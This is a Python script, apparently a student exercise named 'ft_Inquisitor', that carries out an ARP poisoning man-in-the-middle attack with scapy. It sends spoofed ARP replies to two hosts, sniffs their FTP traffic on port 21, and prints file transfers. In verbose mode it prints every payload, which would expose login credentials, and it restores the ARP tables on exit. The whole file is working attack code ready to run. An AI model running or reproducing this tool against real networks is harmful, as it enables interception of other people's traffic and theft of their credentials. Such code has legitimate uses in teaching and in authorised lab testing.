#!/usr/bin/env python3

import sys
import argparse
import re
from scapy.all import ARP, send, sniff
import signal
import hashlib
import time

# Define a global variable to control the main loop
running = True
seen_packet_hashes = {}  # To keep track of seen packet payloads and their timestamps
Verbose = False

def is_valid_ip(ip_str):
    try:
        nums = ip_str.split('.')
        if len(nums) != 4:
            return False
        for n in nums:
            if int(n) < 0 or 255 < int(n):
                return False
        return True
    except:
        return False

def is_valid_mac(mac_str):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return bool(mac_pattern.match(mac_str))

def parse_args():
    parser = argparse.ArgumentParser(description="ARP poisoning script")
    parser.add_argument("IP_src", help="Source IP address")
    parser.add_argument("MAC_src", help="Source MAC address")
    parser.add_argument("IP_target", help="Target IP address")
    parser.add_argument("MAC_target", help="Target MAC address")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode")
    
    args = parser.parse_args()
    return args

def validate_args(args):
    try:
        if not is_valid_ip(args.IP_src):
            print("Invalid IP-src")
            sys.exit(1)
        if not is_valid_mac(args.MAC_src):
            print("Invalid MAC-src")
            sys.exit(1)
        if not is_valid_ip(args.IP_target):
            print("Invalid IP-target")
            sys.exit(1)
        if not is_valid_mac(args.MAC_target):
            print("Invalid MAC-target")
            sys.exit(1)
    except Exception as e:
        print("Error: IP or MAC are not valid!")
        sys.exit(1)

def payload_hash(packet):
    """Returns a hash for the payload of a given packet to identify duplicates."""
    if packet.haslayer('Raw'):
        return hashlib.md5(packet['Raw'].load).hexdigest()
    return None

def clean_seen_packets(timeout=1):
    """Remove entries older than the timeout from the seen_packet_hashes."""
    current_time = time.time()
    for packet_hash in list(seen_packet_hashes):
        if current_time - seen_packet_hashes[packet_hash] > timeout:
            del seen_packet_hashes[packet_hash]

def sniff_ftp_packets(packet):
    global seen_packet_hashes
    if packet.haslayer('Raw'):
        clean_seen_packets()  # Clean old entries before processing new packet
        packet_hash_value = payload_hash(packet)
        if packet_hash_value in seen_packet_hashes:
            return  # Ignore duplicate packet
        seen_packet_hashes[packet_hash_value] = time.time()
        
        packet_load = packet['Raw'].load.decode(errors='ignore')
        if args.verbose:
            print(f"Verbose Mode - FTP Packet: {packet['Raw'].load.decode(errors='ignore')}")
        elif b'RETR ' in packet['Raw'].load or b'STOR ' in packet['Raw'].load:
            print(f"FTP File Transfer Detected: {packet['Raw'].load.decode(errors='ignore')}")
        elif args.verbose:
            if b'USER ' in packet['Raw'].load or b'PASS ' in packet['Raw'].load:
                print(f"FTP Login Detected: {packet['Raw'].load.decode(errors='ignore')}")

def arp_poison(ip_target, mac_target, ip_src):
    packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
    send(packet, verbose=Verbose, count=7)

def restore_arp(ip_src, mac_src, ip_target, mac_target):
    packet = ARP(op=2, psrc=ip_target, hwsrc=mac_target, pdst=ip_src, hwdst=mac_src)
    send(packet, verbose=Verbose, count=7)
    print(f"Sent ARP restore packet: {ip_src} ({mac_src})")

def signal_handler(sig, frame):
    global running
    print("Interrupt signal received. Stopping ARP poisoning and restoring ARP tables...")
    running = False

def exit_gracefully(args):
    restore_arp(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
    restore_arp(args.IP_target, args.MAC_target, args.IP_src, args.MAC_src)
    print("ARP tables restored. Exiting.")

def main():
    global running, args, Verbose
    args = parse_args()
    if len(sys.argv) < 5:
        print("Usage: ./ft_Inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target> [-v]")
        return
    validate_args(args)
    if(args.verbose):
        Verbose = True
    # Set up the signal handler to capture SIGINT
    signal.signal(signal.SIGINT, signal_handler)

    try:
        print("Starting ARP poisoning...")
        print(f"Sent ARP packet: {args.IP_src}")
        print(f"Sent ARP packet: {args.IP_target}\n")
        while running:
            arp_poison(args.IP_src, args.MAC_src, args.IP_target)
            arp_poison(args.IP_target, args.MAC_target, args.IP_src)
            sniff(prn=sniff_ftp_packets, filter="tcp port 21", iface="eth0", timeout=10)
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        exit_gracefully(args)

if __name__ == "__main__":
    main()
